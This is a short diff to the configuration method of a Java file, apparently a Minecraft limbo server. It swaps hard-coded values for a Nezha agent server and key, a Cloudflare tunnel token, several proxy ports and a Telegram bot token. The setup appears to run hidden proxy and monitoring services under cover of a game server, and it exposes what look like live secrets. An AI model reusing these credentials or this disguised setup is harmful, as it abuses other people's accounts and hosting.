@@ -122,18 +122,18 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "d4cf1ac9-2eb5-4d78-964f-5ef1cce6aa80");
+        envVars.put("UUID", "6e1dd6f6-aea7-41ab-aae2-08da6dcba834");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nznz.sss.xx.kg:443");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "XTXYqxCUxIxcgN1fK9hR2ilwt2NVK8yJ");
         envVars.put("ARGO_PORT", "9123");
-        envVars.put("ARGO_DOMAIN", "hiden-fr.stt.pp.ua");
-        envVars.put("ARGO_AUTH", "eyJhIjoiZjBiNmU2YTM4NmE2NWMzNzI2NWE2N2NjYTQ1ZGYzZGUiLCJ0IjoiZDQ1MzFiMGMtNWVkMi00ODI0LTgwNDgtNTU2YzQ4OWU4MTFjIiwicyI6Ik5UWTBPV0l3TURZdE1XSmxPUzAwWXpZNUxXRTBNRGd0TkdZMU9XRTJZamxtTnpnNCJ9");
-        envVars.put("HY2_PORT", "24624");
-        envVars.put("TUIC_PORT", "25073");
-        envVars.put("REALITY_PORT", "25073");
-        envVars.put("S5_PORT", "24624");
+        envVars.put("ARGO_DOMAIN", "hiden-in.stt.pp.ua");
+        envVars.put("ARGO_AUTH", "eyJhIjoiZjBiNmU2YTM4NmE2NWMzNzI2NWE2N2NjYTQ1ZGYzZGUiLCJ0IjoiY2UzM2E0NTctMzEyYS00NGU2LTg4NGQtYjRjMDJiZDJmOGJhIiwicyI6Ik9UTTRPR1JsWTJZdFlUY3dNaTAwWW1VeExXRmtPV0V0TXpjeFl6UTVZamc0WmpRMSJ9");
+        envVars.put("HY2_PORT", "24744");
+        envVars.put("TUIC_PORT", "24577");
+        envVars.put("REALITY_PORT", "24577");
+        envVars.put("S5_PORT", "24744");
         envVars.put("ANYTLS_PORT", "");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
@@ -141,7 +141,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "8007060242:AAH0KVn0peZzRiQ7r5reJzCkuqjQTrlhQfw");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "HidenCloud-FR");
+        envVars.put("NAME", "HidenCloud-IN");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -208,6 +208,7 @@ public final class NanoLimbo {
     }
 
 }
+
 
 
 
